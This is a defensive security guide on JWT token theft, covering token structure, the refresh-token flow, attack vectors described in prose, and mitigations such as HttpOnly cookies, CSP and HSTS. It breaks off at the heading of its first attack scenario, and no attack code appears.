# JWT Token Theft

## Table of Contents

1. [Overview Diagram](#overview-diagram)
   - [Key Relationships](#key-relationships)
2. [Introduction and Core Concepts](#introduction-and-core-concepts)
   - [Definition](#definition)
   - [How JWT Authentication Works](#how-jwt-authentication-works)
   - [How the Attack Works](#how-the-attack-works)
   - [Impact](#impact)
   - [Attack Vectors](#attack-vectors)
3. [Defense Principles](#defense-principles)
   - [Core Protection Principles](#core-protection-principles)
   - [When and Where to Apply Defenses](#when-and-where-to-apply-defenses)
4. [Mitigation Strategies](#mitigation-strategies)
   - [Primary Mitigation Techniques](#primary-mitigation-techniques)
   - [Alternative Approaches](#alternative-approaches)
   - [Implementation Considerations](#implementation-considerations)
5. [Real-World Attack Scenarios](#real-world-attack-scenarios)
   - [Scenario 1: XSS-Based Token Theft from Local Storage](#scenario-1-xss-based-token-theft-from-local-storage)
   - [Scenario 2: Token Theft via Compromised Third-Party Script](#scenario-2-token-theft-via-compromised-third-party-script)
   - [Scenario 3: Man-in-the-Middle Attack on Insecure Connection](#scenario-3-man-in-the-middle-attack-on-insecure-connection)
   - [Scenario 4: Token Theft via Browser Extension Malware](#scenario-4-token-theft-via-browser-extension-malware)
6. [Token Storage and Expiration Management](#token-storage-and-expiration-management)
   - [Token Storage Locations](#token-storage-locations)
   - [Expiration Checking Process](#expiration-checking-process)
   - [What Happens When Access Token Expires](#what-happens-when-access-token-expires)
   - [What Happens When Refresh Token Expires](#what-happens-when-refresh-token-expires)

---

## Overview Diagram

```mermaid
flowchart TB
    subgraph LEGEND[" "]
        L1["Attack Type<br/>(Red Border)"]
        L2["Attack Vector<br/>(Orange Border)"]
        L3["Vulnerability Context<br/>(Blue Border)"]
        L4["Defense Mechanism<br/>(Green Border)"]
        L5["Impact/Consequence<br/>(Purple Border)"]
        
        style L1 fill:#fff,stroke:#e74c3c,stroke-width:3px,color:#000
        style L2 fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
        style L3 fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
        style L4 fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style L5 fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
    end

    subgraph ATTACK["Attack Types"]
        JWT[JWT Token Theft]
        style JWT fill:#fff,stroke:#e74c3c,stroke-width:3px,color:#000
    end

    subgraph VECTORS["Attack Vectors"]
        XSS[XSS Injection]
        MITM[Man-in-the-Middle]
        MALWARE[Browser Malware]
        THIRD[Compromised 3rd Party]
        
        style XSS fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
        style MITM fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
        style MALWARE fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
        style THIRD fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
    end

    subgraph CONTEXTS["Vulnerability Contexts"]
        LS[Local Storage]
        SS[Session Storage]
        HTTP[Unencrypted HTTP]
        COOKIE[Insecure Cookies]
        
        style LS fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
        style SS fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
        style HTTP fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
        style COOKIE fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
    end

    subgraph DEFENSES["Defense Mechanisms"]
        HTTPONLY[HttpOnly Cookies]
        SECURE[Secure Flag]
        SAMESITE[SameSite Attribute]
        CSP[Content Security Policy]
        HTTPS[HTTPS Enforcement]
        ROTATION[Token Rotation]
        SHORT[Short-Lived Tokens]
        REFRESH[Refresh Token Pattern]
        
        style HTTPONLY fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style SECURE fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style SAMESITE fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style CSP fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style HTTPS fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style ROTATION fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style SHORT fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style REFRESH fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
    end

    subgraph IMPACTS["Impacts"]
        IMPERSON[Identity Impersonation]
        BREACH[Data Breach]
        PRIV[Privilege Escalation]
        PERSIST[Persistent Access]
        
        style IMPERSON fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
        style BREACH fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
        style PRIV fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
        style PERSIST fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
    end

    JWT -->|exploits| XSS
    JWT -->|exploits| MITM
    JWT -->|exploits| MALWARE
    JWT -->|exploits| THIRD
    
    XSS -->|targets| LS
    XSS -->|targets| SS
    MITM -->|intercepts| HTTP
    MALWARE -->|extracts from| LS
    MALWARE -->|extracts from| COOKIE
    THIRD -->|accesses| LS
    
    LS -.->|mitigated by| HTTPONLY
    SS -.->|mitigated by| HTTPONLY
    HTTP -.->|mitigated by| HTTPS
    COOKIE -.->|mitigated by| SECURE
    COOKIE -.->|mitigated by| SAMESITE
    
    XSS -.->|blocked by| CSP
    XSS -.->|prevented by| HTTPONLY
    
    JWT -.->|limited by| SHORT
    JWT -.->|controlled by| ROTATION
    JWT -.->|managed by| REFRESH
    
    JWT ==>|leads to| IMPERSON
    JWT ==>|leads to| BREACH
    JWT ==>|leads to| PRIV
    JWT ==>|leads to| PERSIST

    style LEGEND fill:#ffffff10,stroke:#333,stroke-width:2px
    style ATTACK fill:#ffffff10,stroke:#333,stroke-width:2px
    style VECTORS fill:#ffffff10,stroke:#333,stroke-width:2px
    style CONTEXTS fill:#ffffff10,stroke:#333,stroke-width:2px
    style DEFENSES fill:#ffffff10,stroke:#333,stroke-width:2px
    style IMPACTS fill:#ffffff10,stroke:#333,stroke-width:2px
```

### Key Relationships

**Attack Vector Relationships:**
- JWT Token Theft exploits multiple attack vectors: XSS injection, man-in-the-middle attacks, browser malware, and compromised third-party scripts
- Each vector targets specific vulnerability contexts where tokens are exposed

**Vulnerability Context Relationships:**
- Local Storage and Session Storage are vulnerable to XSS attacks and malware extraction
- Unencrypted HTTP connections expose tokens to man-in-the-middle interception
- Insecure cookies can be stolen by malware or intercepted in transit

**Defense Mechanism Relationships:**
- HttpOnly cookies prevent JavaScript access, mitigating XSS-based theft from storage
- Secure flag and HTTPS enforcement protect against man-in-the-middle attacks
- SameSite attribute prevents cross-site request forgery with stolen tokens
- Content Security Policy blocks malicious script injection attempts
- Token rotation, short-lived tokens, and refresh token patterns limit the impact window

**Impact Relationships:**
- Successful token theft leads to identity impersonation, data breaches, privilege escalation, and persistent unauthorized access
- The severity depends on token lifetime, permissions, and detection mechanisms

---

## Introduction and Core Concepts

### Definition

**JWT Token Theft** is a security attack where an adversary steals JSON Web Tokens (JWTs) used for authentication and authorization in modern web applications. JWTs are self-contained tokens that encode user identity and permissions, making them valuable targets for attackers. Once stolen, these tokens can be used to impersonate legitimate users without needing their credentials.

According to OWASP (Open Web Application Security Project), this attack falls under multiple categories including **A07:2021 – Identification and Authentication Failures** and **A03:2021 – Injection** (when XSS is the theft vector). The Common Weakness Enumeration (CWE) categorizes this under:
- **CWE-522**: Insufficiently Protected Credentials
- **CWE-311**: Missing Encryption of Sensitive Data
- **CWE-79**: Cross-site Scripting (XSS) when XSS is the vector

### How JWT Authentication Works

Before understanding how JWTs can be stolen, it's essential to understand how JWT-based authentication functions in a typical web application.

#### JWT Structure

A JSON Web Token consists of three parts separated by dots (`.`):

1. **Header**: Contains the token type (JWT) and the signing algorithm (e.g., HS256, RS256)
2. **Payload**: Contains claims - statements about the user and additional metadata (user ID, roles, expiration time)
3. **Signature**: Created by encoding the header and payload, then signing with a secret key to ensure integrity

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
|_____________Header______________|._____________Payload_______________|._______________Signature_______________|
```

#### JWT Authentication Flow

The following diagram illustrates the complete lifecycle of JWT authentication, from initial login through token usage, refresh, and eventual expiration:

```mermaid
sequenceDiagram
    participant U as User
    participant B as Browser
    participant S as Auth Server
    participant API as API Server

    Note over U,API: Phase 1: Initial Authentication
    
    U->>B: Enter credentials (username/password)
    B->>S: POST /login with credentials
    S->>S: Validate credentials against database
    S->>S: Generate JWT Access Token (short-lived: 15min)
    S->>S: Generate Refresh Token (long-lived: 7 days)
    S->>B: Return tokens in response
    Note over S,B: Access Token in body or HttpOnly cookie<br/>Refresh Token in HttpOnly cookie
    B->>B: Store Access Token (cookie/memory/storage)
    B->>U: Login successful - redirect to dashboard

    Note over U,API: Phase 2: Accessing Protected Resources
    
    U->>B: Request protected resource
    B->>B: Retrieve Access Token from storage
    B->>API: GET /api/data with Authorization: Bearer token
    API->>API: Extract JWT from request
    API->>API: Verify signature using secret key
    API->>API: Check expiration (exp claim)
    API->>API: Validate claims (issuer/audience/permissions)
    API->>B: Return protected data
    B->>U: Display data to user

    Note over U,API: Phase 3: Subsequent Requests (Token Still Valid)
    
    U->>B: Request another resource
    B->>API: GET /api/profile with same Access Token
    API->>API: Verify token (still valid)
    API->>B: Return profile data

    Note over U,API: Phase 4: Access Token Expires
    
    U->>B: Request resource after 15 minutes
    B->>API: GET /api/data with expired Access Token
    API->>API: Verify token
    API->>API: Check expiration - TOKEN EXPIRED
    API->>B: 401 Unauthorized - Token expired
    
    Note over U,API: Phase 5: Token Refresh
    
    B->>B: Detect 401 response
    B->>S: POST /refresh with Refresh Token
    Note over B,S: Refresh Token sent via HttpOnly cookie
    S->>S: Validate Refresh Token
    S->>S: Check if Refresh Token is revoked
    S->>S: Generate new Access Token
    S->>S: Optionally rotate Refresh Token
    S->>B: Return new Access Token
    B->>B: Store new Access Token
    B->>API: Retry original request with new token
    API->>API: Verify new token (valid)
    API->>B: Return requested data
    B->>U: Display data (seamless experience)

    Note over U,API: Phase 6: Refresh Token Expires or User Logs Out
    
    U->>B: Request after Refresh Token expires
    B->>API: GET /api/data with expired Access Token
    API->>B: 401 Unauthorized
    B->>S: POST /refresh with expired Refresh Token
    S->>S: Validate Refresh Token - EXPIRED
    S->>B: 401 Unauthorized - Session expired
    B->>B: Clear all stored tokens
    B->>U: Redirect to login page

    Note over U,API: Alternative: User Initiates Logout
    
    U->>B: Click logout button
    B->>S: POST /logout with Refresh Token
    S->>S: Add Refresh Token to blacklist/revocation list
    S->>B: Logout successful
    B->>B: Clear Access Token from storage
    B->>B: Clear cookies
    B->>U: Redirect to login page
```

#### Key Concepts in the Flow

**Access Token Characteristics:**
- Short-lived (typically 5-60 minutes)
- Contains user identity and permissions
- Sent with every API request
- Stateless - server doesn't store it
- Cannot be revoked before expiration (in pure stateless implementation)

**Refresh Token Characteristics:**
- Long-lived (hours to days)
- Used only to obtain new access tokens
- Stored more securely (HttpOnly cookie)
- Can be revoked server-side (stored in database)
- Should be rotated on each use for security

**Why This Architecture Matters for Security:**
- Short access token lifetime limits exposure window if stolen
- Refresh tokens enable revocation without constant database lookups
- Separation allows different security treatments for each token type
- Stateless access tokens enable horizontal scaling

**Vulnerability Points (Where Theft Can Occur):**
1. During initial token transmission (if not over HTTPS)
2. While stored in browser (localStorage, sessionStorage, or cookies)
3. During API requests (token in Authorization header)
4. Through XSS if tokens are accessible to JavaScript
5. Via malicious browser extensions with storage access

### How the Attack Works

JWT token theft exploits the fact that tokens must be stored somewhere accessible to the client application. The attack typically follows these stages:

1. **Token Identification**: Attackers identify where the application stores JWT tokens (Local Storage, Session Storage, cookies, or in-memory)

2. **Exploitation**: Using various attack vectors, the attacker gains access to the stored token:
   - **XSS-based theft**: Injecting malicious JavaScript that reads token storage
   - **Network interception**: Capturing tokens transmitted over insecure connections
   - **Malware extraction**: Using browser extensions or malware to access storage
   - **Third-party compromise**: Exploiting vulnerable third-party scripts with storage access

3. **Token Extraction**: The attacker exfiltrates the token to their own infrastructure

4. **Token Replay**: The stolen token is used to authenticate as the victim user, gaining unauthorized access to protected resources

5. **Lateral Movement**: Depending on token permissions and lifetime, attackers may escalate privileges, access sensitive data, or establish persistent access

The critical vulnerability is that JWTs are bearer tokens—anyone possessing the token can use it. Unlike traditional session-based authentication where sessions can be invalidated server-side, stateless JWTs remain valid until expiration.

### Impact

The impact of JWT token theft can be severe and far-reaching:

**Immediate Impacts:**
- **Identity Impersonation**: Attackers can act as the legitimate user with full privileges
- **Authentication Bypass**: Security controls based on authentication are completely circumvented
- **Session Riding**: All actions appear to come from the legitimate user, making detection difficult

**Secondary Impacts:**
- **Data Breach**: Access to sensitive personal information, financial data, or proprietary business information
- **Privilege Escalation**: If the compromised token has elevated permissions, attackers gain administrative access
- **Lateral Movement**: Using the compromised account as a pivot point to attack other systems
- **Reputation Damage**: Users lose trust when their accounts are compromised

**Long-term Consequences:**
- **Persistent Access**: Long-lived tokens provide extended unauthorized access
- **Compliance Violations**: Data breaches may violate GDPR, HIPAA, PCI-DSS, or other regulations
- **Financial Loss**: Through fraudulent transactions, theft of intellectual property, or regulatory fines
- **Legal Liability**: Organizations may face lawsuits from affected users

The severity is amplified by:
- **Token Lifetime**: Longer-lived tokens provide extended windows for exploitation
- **Token Scope**: Tokens with broad permissions cause greater damage
- **Detection Difficulty**: Stateless tokens make anomaly detection challenging

### Attack Vectors

**1. Cross-Site Scripting (XSS)**

The most common vector for JWT theft. Attackers inject malicious JavaScript into the application, which executes in the victim's browser with full access to the same origin. This script can:
- Read from Local Storage or Session Storage where tokens are often stored
- Access cookies if not protected with HttpOnly flag
- Exfiltrate tokens to attacker-controlled servers

**Types of XSS enabling token theft:**
- **Stored XSS**: Malicious script persisted in database (comments, profiles, messages)
- **Reflected XSS**: Script injected via URL parameters or form inputs
- **DOM-based XSS**: Client-side script vulnerabilities

**2. Man-in-the-Middle (MITM) Attacks**

When JWTs are transmitted over unencrypted connections or when HTTPS is improperly implemented:
- **Network Sniffing**: Capturing tokens from HTTP traffic on public Wi-Fi or compromised networks
- **SSL Stripping**: Downgrading HTTPS connections to HTTP
- **Certificate Spoofing**: Using fraudulent certificates to intercept encrypted traffic
- **DNS Hijacking**: Redirecting traffic to attacker-controlled servers

**3. Browser-Based Malware and Extensions**

Malicious software running in the user's browser environment:
- **Malicious Extensions**: Browser extensions with excessive permissions reading storage
- **Trojan Scripts**: Malware injected through compromised software updates
- **Keyloggers and Screen Capture**: Recording authentication flows and token transmission
- **Memory Scraping**: Extracting tokens from browser memory

**4. Compromised Third-Party Scripts**

Modern web applications integrate numerous third-party services:
- **Supply Chain Attacks**: Compromised CDN-hosted libraries (e.g., compromised npm packages)
- **Malicious Analytics Scripts**: Tracking scripts modified to exfiltrate tokens
- **Advertising Networks**: Malvertising injecting token-stealing code
- **Tag Managers**: Compromised tag management systems with storage access

**5. Insecure Storage Practices**

Application design choices that expose tokens:
- **Local Storage Persistence**: Tokens surviving browser sessions and accessible to all scripts
- **Session Storage**: Vulnerable to XSS attacks during active sessions
- **URL Parameters**: Tokens in URLs logged in browser history and server logs
- **Unencrypted Cookies**: Cookies without Secure flag transmitted over HTTP

**6. Physical Access Attacks**

Less common but viable in certain contexts:
- **Browser DevTools**: Accessing Local Storage through developer tools on unlocked devices
- **Browser History**: Tokens exposed in URLs within browsing history
- **Cached Data**: Tokens stored in browser cache on shared computers

**7. Social Engineering**

Human-factor attacks that lead to token exposure:
- **Phishing**: Tricking users into authenticating on fake sites that capture tokens
- **Session Donation**: Tricking users into using attacker-controlled sessions
- **Malicious OAuth Flows**: Exploiting OAuth implementations to obtain access tokens

Each vector requires specific defensive measures, making defense-in-depth essential for comprehensive protection.

---

## Defense Principles

### Core Protection Principles

**1. Principle of Secure Storage**

Tokens must be stored using the most secure mechanism available for the context:
- **Storage Location Matters**: Prefer HttpOnly cookies over JavaScript-accessible storage
- **Encryption at Rest**: Consider encrypting tokens in any client-side storage
- **Minimal Exposure**: Store tokens only as long as necessary
- **Separation of Concerns**: Keep access tokens separate from refresh tokens with different security properties

**Rationale**: The storage mechanism is the first line of defense. If tokens cannot be accessed by malicious scripts, many attack vectors are immediately neutralized.

**2. Principle of Least Privilege**

Tokens should contain minimal necessary permissions and information:
- **Narrow Scope**: Tokens should grant only the permissions needed for specific operations
- **Minimal Claims**: Include only essential user information in token payload
- **Time-Bounded Access**: Use the shortest practical token lifetime
- **Resource-Specific Tokens**: Consider separate tokens for different resources or operations

**Rationale**: Limiting token capabilities reduces the blast radius of a successful theft. Even if stolen, the token's usefulness to attackers is constrained.

**3. Principle of Defense in Depth**

Multiple layers of security protect against token theft:
- **Layered Controls**: Combine storage security, transmission security, and runtime protections
- **Complementary Defenses**: Use multiple techniques that protect against different attack vectors
- **Fail-Safe Defaults**: Design systems to fail securely when protections fail
- **Detection and Response**: Include monitoring to detect and respond to theft

**Rationale**: No single defense is perfect. Multiple overlapping protections ensure that the failure of one layer doesn't compromise the entire system.

**4. Principle of Secure Transmission**

Tokens must be protected during transit:
- **Encryption in Transit**: Always use HTTPS for all token transmission
- **HSTS Enforcement**: Use HTTP Strict Transport Security to prevent downgrade attacks
- **Certificate Pinning**: For high-security contexts, pin certificates to prevent MITM
- **Avoid URL Parameters**: Never pass tokens in URLs where they can be logged

**Rationale**: Tokens intercepted during transmission are as useful to attackers as directly stolen tokens. Transit security is as critical as storage security.

**5. Principle of Time-Limited Validity**

Tokens should have the shortest practical lifetime:
- **Short-Lived Access Tokens**: Minimize the window of opportunity for attackers
- **Refresh Token Rotation**: Change refresh tokens on each use to detect theft
- **Absolute Timeout**: Enforce maximum session duration regardless of activity
- **Idle Timeout**: Expire tokens after periods of inactivity

**Rationale**: Time limitation converts permanent compromise into temporary exposure. Even successful theft has limited value if tokens expire quickly.

**6. Principle of Runtime Verification**

Continuous validation beyond token signature verification:
- **Binding Verification**: Bind tokens to specific clients or contexts
- **Behavioral Analysis**: Detect anomalous usage patterns
- **Geolocation Checks**: Flag tokens used from unexpected locations
- **Device Fingerprinting**: Detect token use from different devices

**Rationale**: Stolen tokens can be detected through usage patterns that differ from legitimate users, enabling rapid response.

### When and Where to Apply Defenses

**Application Architecture Layer**

**Frontend (Browser/Mobile App):**
- Apply storage security controls (HttpOnly cookies, secure flags)
- Implement Content Security Policy
- Minimize token lifetime
- Use in-memory storage for highly sensitive operations
- Implement logout on close for sensitive applications

**Backend (API Server):**
- Validate token binding and context
- Implement rate limiting and anomaly detection
- Enforce short token expiration
- Provide token revocation mechanisms
- Log authentication events for security monitoring

**Network Layer:**
- Enforce HTTPS everywhere with HSTS
- Implement certificate pinning for high-security apps
- Use secure CDN configurations
- Deploy Web Application Firewalls (WAF)

**Development Phase Considerations**

**Design Phase:**
- Choose token storage strategy (HttpOnly cookies vs. other methods)
- Define token lifetime and refresh strategies
- Plan token structure and claims
- Design revocation mechanisms
- Plan monitoring and detection capabilities

**Implementation Phase:**
- Implement secure cookie attributes (HttpOnly, Secure, SameSite)
- Configure Content Security Policy
- Implement HTTPS and HSTS
- Set up token rotation mechanisms
- Implement logging and monitoring

**Testing Phase:**
- Penetration testing for XSS vulnerabilities
- Security testing of token handling
- Testing token expiration and rotation
- Validating HTTPS enforcement
- Testing revocation mechanisms

**Deployment Phase:**
- Configure HTTPS with valid certificates
- Enable HSTS headers
- Deploy Content Security Policy
- Set up security monitoring
- Implement incident response procedures

**Application Context Considerations**

**High-Security Applications (Banking, Healthcare, Government):**
- Mandatory HttpOnly cookies
- Very short token lifetimes (5-15 minutes)
- Aggressive token rotation
- Strong behavioral monitoring
- Multi-factor authentication for sensitive operations
- Token binding to device characteristics

**Standard Web Applications (E-commerce, Social Media, SaaS):**
- HttpOnly cookies for access tokens
- Moderate token lifetimes (15-60 minutes)
- Token rotation on refresh
- Basic anomaly detection
- Secure flag and SameSite on all cookies

**Low-Security Applications (Public Content, Marketing Sites):**
- Still use HttpOnly cookies when possible
- Longer token lifetimes acceptable (hours)
- Basic HTTPS enforcement
- Minimal but present security controls

**Mobile Applications:**
- Use secure storage APIs (Keychain, KeyStore)
- Implement certificate pinning
- Short-lived tokens with background refresh
- Detect jailbreak/root and adjust security
- Consider biometric re-authentication

**Single-Page Applications (SPAs):**
- Prefer HttpOnly cookies over Local Storage
- Implement robust CSP
- Use BFF (Backend-for-Frontend) pattern for token management
- Consider in-memory storage for sensitive operations
- Implement automatic logout on browser close

**Third-Party Integration Context:**
- Minimize third-party script inclusion
- Use Subresource Integrity (SRI) for CDN resources
- Implement strict CSP for third-party content
- Regular audits of third-party dependencies
- Sandbox third-party scripts when possible

---

## Mitigation Strategies

### Primary Mitigation Techniques

**1. HttpOnly and Secure Cookies**

**Description**: Store JWT tokens in cookies with HttpOnly and Secure flags enabled. HttpOnly prevents JavaScript from accessing the cookie, while Secure ensures transmission only over HTTPS.

**How it works:**
- Server sets JWT in cookie with HttpOnly flag during authentication
- Browser automatically includes cookie in requests to same origin
- JavaScript cannot read or modify the cookie, blocking XSS-based theft
- Secure flag prevents transmission over unencrypted connections

**Protection provided:**
- Eliminates XSS-based token theft from storage
- Prevents malicious scripts from accessing tokens
- Protects against MITM attacks when combined with Secure flag
- Automatic handling by browser reduces implementation errors

**Limitations:**
- Vulnerable to CSRF attacks (requires SameSite attribute)
- Doesn't protect against compromised backend
- Requires careful CORS configuration
- May complicate cross-domain authentication flows

**Best practices:**
- Always combine HttpOnly with Secure flag
- Add SameSite attribute (Strict or Lax)
- Set appropriate Path and Domain attributes
- Use __Host- prefix for additional security
- Implement CSRF tokens for state-changing operations

**2. SameSite Cookie Attribute**

**Description**: The SameSite attribute controls whether cookies are sent with cross-site requests, providing defense against CSRF attacks and limiting the impact of stolen tokens.

**How it works:**
- **SameSite=Strict**: Cookie never sent with cross-site requests
- **SameSite=Lax**: Cookie sent with top-level navigation but not with AJAX or image requests
- **SameSite=None**: Cookie sent with all requests (requires Secure flag)

**Protection provided:**
- Prevents CSRF attacks by default with Strict or Lax
- Limits cross-site token leakage
- Reduces attack surface for stolen tokens
- Works automatically without additional code

**Limitations:**
- SameSite=Strict may break legitimate cross-site flows
- Not supported by older browsers (though support is now widespread)
- Doesn't prevent token theft, only limits usage
- Can complicate OAuth and SSO implementations

**Best practices:**
- Use SameSite=Lax as default for most applications
- Use SameSite=Strict for high-security applications
- Only use SameSite=None when cross-site access is essential
- Test authentication flows with different SameSite values
- Combine with other CSRF protections

**3. Content Security Policy (CSP)**

**Description**: CSP is a browser security mechanism that restricts which resources can load and execute on a web page, significantly reducing XSS attack surface.

**How it works:**
- Server sends CSP header defining allowed script sources
- Browser blocks inline scripts and unauthorized external scripts
- Prevents execution of injected malicious code
- Can be configured to allow only trusted domains

**Protection provided:**
- Blocks inline script execution (primary XSS vector)
- Prevents loading of malicious external scripts
- Limits data exfiltration channels
- Provides defense in depth against XSS

**Limitations:**
- Complex to implement correctly
- Can break legitimate functionality if too restrictive
- Requires refactoring inline scripts and event handlers
- Some legacy browsers lack full support
- Bypassable if policy is too permissive

**Best practices:**
- Start with restrictive policy and loosen as needed
- Use nonces or hashes for inline scripts
- Avoid unsafe-inline and unsafe-eval directives
- Implement CSP in report-only mode first
- Regularly review and update CSP
- Use strict-dynamic for modern browsers

**4. Short-Lived Access Tokens with Refresh Tokens**

**Description**: Use short-lived JWT access tokens (5-15 minutes) paired with longer-lived refresh tokens, limiting the window of opportunity for stolen access tokens.

**How it works:**
- Access tokens have very short expiration (minutes)
- Refresh tokens have longer expiration (hours/days) but more restricted use
- Client automatically requests new access token using refresh token before expiration
- Refresh tokens stored more securely and rotated on each use

**Protection provided:**
- Limits damage from stolen access tokens to short time window
- Enables token revocation through refresh token invalidation
- Reduces value of stolen access tokens
- Allows detection through refresh token rotation

**Limitations:**
- Adds complexity to client implementation
- Requires automatic token refresh logic
- Stolen refresh tokens still problematic
- Requires backend to manage refresh token state
- May cause interruptions if refresh fails

**Best practices:**
- Use very short access token lifetime (5-15 minutes)
- Rotate refresh tokens on each use
- Store refresh tokens separately with higher security
- Implement refresh token expiration and revocation
- Monitor for anomalous refresh patterns
- Use different signing keys for access and refresh tokens

**5. Token Binding and Context Validation**

**Description**: Bind tokens to specific client characteristics and validate these bindings on each request, making stolen tokens unusable from different contexts.

**How it works:**
- Include client fingerprint in token claims (IP, user agent, device ID)
- Server validates these characteristics match on each request
- Mismatch indicates potential token theft
- Can combine multiple factors for stronger binding

**Protection provided:**
- Stolen tokens unusable from different contexts
- Enables detection of token theft attempts
- Adds verification beyond signature validation
- Makes token replay attacks more difficult

**Limitations:**
- Legitimate users may have changing IPs (mobile networks)
- User agents can be spoofed
- May cause false positives and usability issues
- Adds computational overhead to validation
- Doesn't prevent theft, only limits usage

**Best practices:**
- Use multiple binding factors
- Allow some flexibility for legitimate changes (IP ranges)
- Log binding validation failures for security monitoring
- Consider binding strength based on operation sensitivity
- Implement graceful degradation for minor mismatches
- Use cryptographic binding for high-security contexts

**6. HTTPS Everywhere with HSTS**

**Description**: Enforce HTTPS for all communications and implement HTTP Strict Transport Security (HSTS) to prevent downgrade attacks and man-in-the-middle token interception.

**How it works:**
- All token transmission occurs over encrypted HTTPS
- HSTS header tells browser to always use HTTPS
- Browser refuses HTTP connections to the domain
- Prevents SSL stripping and downgrade attacks

**Protection provided:**
- Encrypts tokens in transit, preventing network interception
- Blocks downgrade attacks to unencrypted HTTP
- Protects against passive network monitoring
- Required for Secure cookie flag to function

**Limitations:**
- Doesn't protect against endpoint compromise
- Requires valid SSL certificates
- First request vulnerable before HSTS seen (use preload)
- Doesn't prevent application-level attacks
- Certificate authorities are trust points

**Best practices:**
- Enable HSTS with max-age of at least one year
- Include subdomains in HSTS policy
- Submit domain to HSTS preload list
- Use strong TLS configuration (TLS 1.3+)
- Implement certificate pinning for critical applications
- Redirect all HTTP to HTTPS at infrastructure level

### Alternative Approaches

**1. In-Memory Token Storage (SPA Pattern)**

**Description**: Store tokens only in JavaScript memory variables, never persisting to any browser storage.

**When to use:**
- High-security single-page applications
- Short user sessions acceptable
- When XSS risk is high but manageable
- Applications with aggressive security requirements

**Advantages:**
- Tokens lost on page reload or browser close
- Not accessible from other tabs or persistence
- Immune to storage-based theft vectors
- Simple implementation

**Disadvantages:**
- Tokens lost on page refresh (poor UX)
- Requires re-authentication frequently
- Doesn't work for multi-tab applications
- Still vulnerable to XSS during session
- Complex state management

**2. Backend-for-Frontend (BFF) Pattern**

**Description**: Move all token management to a backend service specifically for the frontend, keeping tokens entirely server-side.

**When to use:**
- Microservices architectures
- High-security applications
- When frontend security cannot be guaranteed
- Complex authentication flows

**Advantages:**
- Tokens never exposed to browser
- Immune to XSS-based token theft
- Centralized security enforcement
- Simplified frontend implementation

**Disadvantages:**
- Additional infrastructure complexity
- Requires session management in BFF
- May increase latency
- Session state needs to be managed
- Scaling considerations for BFF service

**3. Token Encryption at Client Side**

**Description**: Encrypt tokens before storing in browser storage using encryption keys derived from user credentials or device characteristics.

**When to use:**
- When HttpOnly cookies cannot be used
- Mobile applications with secure storage
- Hybrid approaches needing storage
- Legacy system constraints

**Advantages:**
- Adds defense layer even if storage accessed
- Protects stored tokens at rest
- Can use device-specific keys
- Compatible with various storage mechanisms

**Disadvantages:**
- Encryption key management complexity
- Keys may be extractable through XSS
- Doesn't prevent in-memory theft
- Performance overhead
- False sense of security if not implemented correctly

**4. Per-Request Token Generation**

**Description**: Generate single-use tokens for each API request, with very short validity windows (seconds).

**When to use:**
- High-security financial transactions
- Operations requiring maximum security
- When replay attack prevention is critical
- APIs with low request frequency

**Advantages:**
- Stolen tokens immediately worthless
- Prevents replay attacks
- Minimal theft window
- Strong non-repudiation

**Disadvantages:**
- Significant performance overhead
- Complex client implementation
- Tight clock synchronization required
- May impact user experience
- Difficult to implement for real-time features

**5. Mutual TLS (mTLS) Authentication**

**Description**: Use client certificates in addition to JWT tokens for authentication, binding tokens to specific client certificates.

**When to use:**
- High-security B2B APIs
- Internal microservices communication
- IoT device authentication
- When PKI infrastructure available

**Advantages:**
- Strong cryptographic binding
- Stolen tokens unusable without certificate
- Industry standard for high-security
- Prevents many attack vectors

**Disadvantages:**
- Complex certificate management
- Difficult user experience for consumer apps
- Not suitable for public-facing applications
- Requires PKI infrastructure
- Browser support varies

### Implementation Considerations

**Performance Impact:**
- HttpOnly cookies have minimal overhead
- Short-lived tokens require frequent refresh operations
- Token validation adds per-request latency
- Encryption/decryption has computational cost
- CSP enforcement is browser-side with minimal impact

**User Experience:**
- Short token lifetimes require seamless automatic refresh
- Failed refresh requires re-authentication (disrupts UX)
- HTTPS enforcement may break mixed content
- In-memory storage loses state on refresh
- Balance security with usability

**Scalability:**
- Stateless JWTs scale horizontally well
- Token revocation requires distributed state
- Refresh token rotation needs coordination
- BFF pattern needs scaling of BFF service
- Monitoring and logging volume increases

**Compatibility:**
- Older browsers may not support all security features
- Mobile apps need platform-specific implementations
- Third-party integrations may have constraints
- Legacy systems may limit security options
- Cross-domain scenarios need careful design

**Operational Complexity:**
- Token rotation requires robust error handling
- Multiple security layers increase debugging difficulty
- Monitoring and alerting systems needed
- Incident response procedures required
- Regular security audits necessary

**Development Effort:**
- Proper CSP implementation requires significant refactoring
- Token refresh logic adds client complexity
- Security testing requires specialized expertise
- Documentation and training necessary
- Ongoing maintenance and updates required

**Cost Considerations:**
- SSL certificates and infrastructure
- Security monitoring and logging tools
- Performance overhead may require more resources
- Security audit and penetration testing costs
- Training and expertise development

---

## Real-World Attack Scenarios

### Scenario 1: XSS-Based Token Theft from Local Storage

#### Attack Flow

